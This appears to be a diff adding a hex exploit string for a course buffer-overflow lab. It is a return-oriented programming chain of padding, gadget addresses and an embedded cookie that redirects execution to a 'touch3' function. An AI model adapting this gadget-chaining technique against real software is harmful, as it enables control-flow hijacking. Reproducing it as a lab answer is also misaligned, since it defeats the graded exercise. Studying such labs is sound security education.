@@ -1,0 +1,16 @@
+33 33 33 33 33 33 33 33       /* 000: Padding 8 bytes                      */
+33 33 33 33 33 33 33 33       /* 008: Padding 8 bytes                      */
+33 33 33 33 33 33 33 33       /* 016: Padding 8 bytes                      */
+33 33 33 33 33 33 33 33       /* 024: Padding 8 bytes                      */
+33 33 33 33 33 33 33 33       /* 032: Padding 8 bytes                      */
+d0 1a 40 00 00 00 00 00       /* 040: movq %rsp, %rax; retq                */
+76 1a 40 00 00 00 00 00       /* 048: movq %rax, %rdi; retq                */
+8a 1a 40 00 00 00 00 00       /* 056: popq %rax; retq                      */
+48 00 00 00 00 00 00 00       /* 064: Popped %rax - distance to cookie     */
+d9 1a 40 00 00 00 00 00       /* 072: movl %eax, %ecx; retq                */
+00 1b 40 00 00 00 00 00       /* 080: movl %ecx, %edx; retq                */
+aa 1a 40 00 00 00 00 00       /* 088: movl %edx, %esi; retq                */
+a3 1a 40 00 00 00 00 00       /* 096: lea (%rdi, %rsi, 1), %rax; retq      */
+76 1a 40 00 00 00 00 00       /* 104: movq %rax, %rdi; retq                */
+ca 19 40 00 00 00 00 00       /* 112: Return to touch3                     */
+34 33 32 32 37 61 38 38       /* 120: Cookie time!                         */
